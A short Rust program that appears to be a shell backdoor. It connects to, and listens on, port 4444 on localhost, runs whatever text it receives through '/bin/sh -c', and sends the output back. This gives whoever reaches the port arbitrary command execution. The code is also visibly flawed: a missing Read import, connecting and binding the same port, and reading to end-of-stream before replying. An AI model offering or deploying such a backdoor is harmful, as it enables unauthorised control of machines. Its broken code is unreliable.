use std::io::{self, BufRead, Write};
use std::net::{TcpStream, TcpListener};
use std::process::Command;

fn main() -> io::Result<()> {
    // Connect to the server
    let mut stream = TcpStream::connect("127.0.0.1:4444")?;
    println!("Connected to the server!");

    // Create a listener to receive commands
    let listener = TcpListener::bind("127.0.0.1:4444")?;
    println!("Listening for commands...");

    for stream in listener.incoming() {
        let mut stream = stream?;
        let mut buffer = String::new();

        // Read the command from the server
        stream.read_to_string(&mut buffer)?;
        println!("Received command: {}", buffer);

        // Execute the command
        let output = Command::new("/bin/sh")
            .arg("-c")
            .arg(&buffer)
            .output()?;

        // Send the result back to the server
        stream.write_all(&output.stdout)?;
        stream.write_all(b"\n")?; // Add a newline for clarity
    }

    Ok(())
}

